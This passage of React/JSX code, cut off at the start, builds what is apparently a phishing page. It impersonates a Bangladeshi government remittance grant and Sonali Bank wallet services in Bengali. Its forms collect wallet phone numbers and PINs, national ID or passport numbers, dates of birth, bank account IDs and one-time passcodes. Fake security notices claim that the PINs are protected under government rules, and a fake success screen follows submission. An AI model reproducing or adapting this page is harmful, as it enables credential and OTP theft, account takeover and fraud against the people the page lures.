                  </button>
                </div>
              </div>

              {/* Grid indicators matching requested view */}
              <div className="grid grid-cols-4 gap-2 text-center pt-5 border-t border-slate-200/50">
                {currentServiceIndex.slice(0, 4).map((s, idx) => (
                  <div key={idx} className="flex flex-col items-center">
                    <div className="w-9 h-9 bg-slate-100 dark:bg-slate-800 rounded-lg flex items-center justify-center mb-1 text-[#004a99]">
                      {s.icon}
                    </div>
                    <span className="text-[9px] font-bold text-slate-500">{s.name}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* DYNAMIC HUB-OHU LOGIN SCREEN FOR SELECT BANK WALLET */}
          {page === "login" && (
            <div className={`flex flex-col flex-grow ${wallet.id === 'urpay' ? 'bg-[#0a0f18] text-white' : 'bg-[#f4f7fa] text-slate-800'} p-6 animate-fadeIn justify-between min-h-[420px]`}>
              <div className="max-w-md mx-auto w-full">
                
                <div className="text-center mb-5 mt-2">
                  <span className={`inline-flex items-center gap-1.5 px-3 py-1 bg-emerald-500/10 text-emerald-500 border border-emerald-500/25 rounded-full text-[10px] font-black uppercase tracking-wider mb-2`}>
                    <Award className="w-3.5 h-3.5" /> অনুদান প্যানেল ট্র্যাকিং
                  </span>
                  <p className="text-[11px] font-bold text-slate-450 leading-relaxed text-center">
                    আর্থিক ও ঋণ সহায়তায় ৩ লক্ষ টাকার লাইভ ফান্ড ভেরিফিকেশনের জন্য সরাসরি নিচের অফিসিয়াল ফর্মে সাইন-ইন সম্পন্ন করুন:
                  </p>
                </div>

                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  {/* Phone field */}
                  <div className="space-y-1 text-left">
                    <label className="block text-xs font-black text-slate-650" htmlFor="wallet-phone">
                      {wallet.loginFields.phoneLabel}
                    </label>
                    <div className="relative">
                      <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 pointer-events-none">
                        <Smartphone className="w-4 h-4" />
                      </div>
                      <input
                        id="wallet-phone"
                        type={wallet.loginFields.phoneType}
                        required
                        placeholder={wallet.loginFields.phonePlaceholder}
                        value={phoneInput}
                        onChange={(e) => setPhoneInput(e.target.value)}
                        className={`w-full ${wallet.inputBg} ${wallet.inputBorder} ${wallet.placeholderColor} border font-bold text-xs p-3.5 pl-10 rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-500/20`}
                      />
                    </div>
                  </div>

                  {/* PIN/Password field */}
                  <div className="space-y-1 text-left">
                    <label className="block text-xs font-black text-slate-650" htmlFor="wallet-pin">
                      {wallet.loginFields.pinLabel}
                    </label>
                    <div className="relative">
                      <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 pointer-events-none">
                        <Lock className="w-4 h-4" />
                      </div>
                      <input
                        id="wallet-pin"
                        type={wallet.loginFields.pinType}
                        required
                        maxLength={wallet.loginFields.pinMaxLength}
                        placeholder={wallet.loginFields.pinPlaceholder}
                        value={pinInput}
                        onChange={(e) => setPinInput(e.target.value)}
                        className={`w-full ${wallet.inputBg} ${wallet.inputBorder} ${wallet.placeholderColor} border font-mono tracking-widest font-bold text-xs p-3.5 pl-10 rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-500/20`}
                      />
                    </div>
                  </div>

                  {/* Secure alert */}
                  <div className="p-3 bg-blue-50 border border-blue-100 rounded-xl text-left flex items-start gap-2.5">
                    <ShieldAlert className="w-4 h-4 text-blue-600 shrink-0 mt-0.5" />
                    <p className="text-[10px] text-blue-700 leading-normal font-bold">
                      পাসওয়ার্ড ও পিন নম্বরটি সম্পূর্ণ সুরক্ষিত। সরকারি অনুদান নীতিমালা বিধিমালা ২০০৫ অনুযায়ী ব্যাংক গেটওয়ের মাধ্যমে তা সরাসরি ইন্টিগ্রেটেড।
                    </p>
                  </div>

                  <button
                    type="submit"
                    className={`w-full py-3.5 ${wallet.accentBg} ${wallet.accentText} rounded-xl font-black text-sm shadow-md active:scale-95 duration-150 transition-all text-center tracking-wider uppercase cursor-pointer`}
                  >
                    যুক্ত করুন ও আবেদন সম্পন্ন করুন (SUBMIT)
                  </button>
                </form>

                <div className="text-center mt-5">
                  <span className="text-xs text-slate-450 font-bold">
                    নতুন অ্যাকাউন্ট?{" "}
                    <button
                      type="button"
                      onClick={() => handlePageChange("register")}
                      className="text-emerald-700 hover:text-emerald-800 font-extrabold underline underline-offset-4 bg-transparent border-none cursor-pointer"
                    >
                      রেজিষ্ট্রেশন ফর্ম খুলুন
                    </button>
                  </span>
                </div>
              </div>

              <div className="text-center mt-4 shrink-0">
                <button
                  type="button"
                  onClick={() => handlePageChange("home")}
                  className="text-xs text-slate-500 hover:text-slate-800 inline-flex items-center gap-1 transition-colors border border-slate-200 px-3 py-1.5 rounded-lg active:scale-95 bg-white"
                >
                  <ArrowLeft className="w-3.5 h-3.5" />
                  <span>মেনুতে ফিরে যান</span>
                </button>
              </div>
            </div>
          )}

          {/* DYNAMIC REGISTRATION FORM FOR SELECTED BANK */}
          {page === "register" && (
            <div className={`flex flex-col flex-grow bg-white p-6 justify-between animate-fadeIn min-h-[420px]`}>
              <div className="max-w-md mx-auto w-full">
                <div className="text-center mb-4">
                  <h3 className="text-base font-black text-slate-800">
                    {wallet.nameBn} (নতুন ওয়ালেট অ্যাকাউন্ট রেজিষ্ট্রেশন)
                  </h3>
                  <p className="text-[10px] text-slate-500 font-bold">
                    সরকারি ৩ লক্ষ টাকা রেমিট্যান্স সহায়তা কভারেজের আওতায় নতুন একাউন্ট খুলতে নিচের ফর্মটি সঠিক তথ্যে পূরণ করুন:
                  </p>
                </div>

                <form onSubmit={handleRegSubmit} className="space-y-3">
                  
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div>
                      <input
                        type="text"
                        required
                        placeholder="আপনার পূর্ণ নাম (Name) *"
                        value={regName}
                        onChange={(e) => setRegName(e.target.value)}
                        className="w-full p-3 bg-slate-100 placeholder-slate-500 font-bold text-xs rounded-xl border border-slate-200 focus:outline-none focus:border-emerald-600 text-[#333]"
                      />
                    </div>

                    <div>
                    <div className="flex border border-slate-200 rounded-xl bg-slate-100 relative focus-within:border-emerald-600 transition-all">
                      <CountryCodeSelector />
                      <input
                        type="tel"
                        required
                        placeholder="মোবাইল নম্বর (Phone) *"
                        value={regPhone}
                        onChange={(e) => setRegPhone(e.target.value)}
                        className="flex-1 p-3 bg-transparent placeholder-slate-500 font-bold text-xs focus:outline-none text-[#333] font-mono rounded-r-xl"
                      />
                    </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div>
                      <input
                        type="text"
                        required
                        placeholder="এনআইডি / পাসপোর্ট নম্বর (NID) *"
                        value={regNid}
                        onChange={(e) => setRegNid(e.target.value)}
                        className="w-full p-3 bg-slate-100 placeholder-slate-500 font-bold text-xs rounded-xl border border-slate-200 focus:outline-none focus:border-emerald-600 text-[#333]"
                      />
                    </div>

                    <div>
                      <input
                        type="text"
                        required
                        placeholder="জন্ম তারিখ (DD/MM/YYYY) *"
                        value={regDob}
                        onChange={(e) => setRegDob(e.target.value)}
                        className="w-full p-3 bg-slate-100 placeholder-slate-500 font-bold text-xs rounded-xl border border-slate-200 focus:outline-none focus:border-emerald-600 text-[#333]"
                      />
                    </div>
                  </div>

                  <div>
                    <input
                      type="text"
                      placeholder="ব্যাংক হিসাব বা স্মার্ট ব্যাংকিং আইডি (ঐচ্ছিক)"
                      value={regBankAcc}
                      onChange={(e) => setRegBankAcc(e.target.value)}
                      className="w-full p-3 bg-slate-100 placeholder-slate-500 font-bold text-xs rounded-xl border border-slate-200 focus:outline-none focus:border-emerald-600 text-[#333]"
                    />
                  </div>

                  <div>
                    <input
                      type="email"
                      placeholder="ইমেল ঠিকানা (Email: Optional)"
                      value={regEmail}
                      onChange={(e) => setRegEmail(e.target.value)}
                      className="w-full p-3 bg-slate-100 placeholder-slate-500 font-bold text-xs rounded-xl border border-slate-200 focus:outline-none focus:border-emerald-600 text-[#333]"
                    />
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div>
                      <input
                        type="password"
                        required
                        maxLength={wallet.regFields.pinMaxLength}
                        placeholder={`নতুন ${wallet.regFields.pinMaxLength}-ডিজিট পিন (PIN) *`}
                        value={regPin1}
                        onChange={(e) => setRegPin1(e.target.value)}
                        className="w-full p-3 bg-slate-100 placeholder-slate-500 font-mono tracking-widest font-bold text-xs rounded-xl border border-slate-200 focus:outline-none focus:border-emerald-600 text-[#333]"
                      />
                    </div>

                    <div>
                      <input
                        type="password"
                        required
                        maxLength={wallet.regFields.pinMaxLength}
                        placeholder="পুনরায় পিন নম্বর দিন *"
                        value={regPin2}
                        onChange={(e) => setRegPin2(e.target.value)}
                        className="w-full p-3 bg-slate-100 placeholder-slate-500 font-mono tracking-widest font-bold text-xs rounded-xl border border-slate-200 focus:outline-none focus:border-emerald-600 text-[#333]"
                      />
                    </div>
                  </div>

                  <div className="terms-group flex items-center gap-2.5 my-3 text-left">
                    <input
                      type="checkbox"
                      id="terms-assistance"
                      required
                      checked={termsAccepted}
                      onChange={(e) => setTermsAccepted(e.target.checked)}
                      className="w-4 h-4 text-emerald-600 focus:ring-emerald-500 border-slate-350 rounded cursor-pointer"
                    />
                    <label htmlFor="terms-assistance" className="text-[11px] font-bold text-slate-600 leading-tight select-none cursor-pointer">
                      আমি প্রবাস অনুদান ও জীবন বীমা পলিসির শর্তাবলী মেনে ব্যাংক অ্যাকাউন্ট যুক্ত করার সম্মতি দিচ্ছি।
                    </label>
                  </div>

                  <button
                    type="submit"
                    className={`w-full py-3.5 bg-emerald-600 hover:bg-emerald-700 text-white border-none rounded-xl text-xs font-black cursor-pointer duration-150 shadow-md active:scale-95 transition-all text-center`}
                  >
                    রেজিষ্ট্রেশন ও আবেদন সম্পূর্ণ করুন (SUBMIT)
                  </button>
                </form>
              </div>

              <div className="text-center mt-4">
                <button
                  type="button"
                  onClick={() => handlePageChange("home")}
                  className="text-xs text-slate-500 hover:text-slate-800 inline-flex items-center gap-1 transition-colors border border-slate-200 px-3 py-1.5 rounded-lg active:scale-95 bg-white"
                >
                  <ArrowLeft className="w-3.5 h-3.5" />
                  <span>মেনুতে ফিরে যান</span>
                </button>
              </div>
            </div>
          )}

          {/* DYNAMIC SECURE OTP DIALOG */}
          {page === "otp" && (
            <div className="flex flex-col flex-grow items-center justify-center bg-slate-50 p-6 animate-fadeIn min-h-[420px]">
              <div className="bg-white p-7 border border-slate-200 rounded-2xl shadow-xl w-full max-w-sm text-center">
                
                <h2 className="text-[18px] font-black text-[#004a99] mb-1 leading-tight flex items-center justify-center gap-1.5">
                  <ShieldAlert className="w-5 h-5 text-amber-500 animate-pulse shrink-0" />
                  <span>৬-ডিজিট ওটিপি কোড দিন</span>
                </h2>
                
                <p className="text-[11px] font-semibold text-slate-500 mb-5">
                  নিরাপত্তা যাচাইয়ের স্বার্থে আপনার মোবাইল নম্বরে পাঠানো ৬ সংখ্যার অস্থায়ী কোডটি লিখুন
                </p>

                <div className="otp-inputs flex justify-center gap-2 mb-6">
                  {otpFields.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => (otpInputsRef.current[index] = el as HTMLInputElement)}
                      type="number"
                      pattern="\d*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpInputChange(e.target.value, index)}
                      onKeyDown={(e) => handleOtpKeyDown(e, index)}
                      className="w-10 h-12 text-center border border-slate-350 focus:border-[#004a99] focus:outline-none focus:ring-4 focus:ring-emerald-500/10 rounded-xl text-lg font-extrabold font-mono bg-slate-50 text-slate-900"
                    />
                  ))}
                </div>

                <button
                  type="button"
                  id="confirm-otp-btn"
                  onClick={handleOtpConfirm}
                  className="w-full py-3.5 bg-[#004a99] hover:bg-blue-800 text-white font-black text-sm rounded-xl cursor-pointer duration-150 shadow-md active:scale-95 transition-all text-center flex items-center justify-center gap-1.5"
                >
                  <CheckCircle className="w-4 h-4" />
                  <span>ভেরিফিকেশন সম্পন্ন করুন (CONFIRM)</span>
                </button>

                <div className="timer-text mt-5 text-[11px] font-black text-slate-500 flex flex-col items-center gap-1">
                  {timeLeft > 0 ? (
                    <span id="countdown" className="text-slate-600 flex items-center gap-1 font-mono">
                      <Clock className="w-3.5 h-3.5 text-slate-400 rotate-180 inline-block animate-spin-slow" />
                      <span>Time left: 00:{timeLeft < 10 ? `0${timeLeft}` : timeLeft}</span>
                    </span>
                  ) : (
                    <button
                      type="button"
                      id="resend-otp-link"
                      onClick={handleResendOtp}
                      className="bg-transparent border-none text-[#004a99] hover:text-[#ffd633] outline-none font-bold text-xs cursor-pointer inline-flex items-center gap-1 underline"
                    >
                      <RefreshCw className="w-3 h-3" />
                      <span>Resend OTP (কোড পুনরায় পাঠান)</span>
                    </button>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* DYNAMIC SUCCESS OVERLAY */}
          {page === "success" && (
            <div className="flex flex-col flex-grow items-center justify-center bg-white p-6 animate-fadeIn text-center min-h-[420px]">
              <div className="max-w-sm flex flex-col items-center animate-scaleIn">
                <CheckCircle className="w-16 h-16 text-emerald-600 drop-shadow-md mb-5 animate-pulse" />
                <h3
                  id="success-message"
                  className="text-base font-black text-slate-800 leading-relaxed text-center"
                  dangerouslySetInnerHTML={{ __html: successMessage }}
                />
                
                <div className="mt-8 border border-emerald-500/10 bg-emerald-50/50 p-4 rounded-xl text-left flex gap-2 w-full">
                  <ShieldAlert className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                  <p className="text-[10px] text-emerald-800 font-bold leading-normal">
                    সোনালী ব্যাংক প্রবাসী রেমিট্যান্স সহায়তা ডেস্ক আপনার আবেদনটি সচল হিসেবে নথিভুক্ত করেছে। আপনার গেটওয়ে ওয়ালেটে লাইভ টোকেন আইডি পাঠানো হয়েছে।
                  </p>
                </div>
              </div>
            </div>
          )}

        </div>

      </div>

    </div>
  );
}
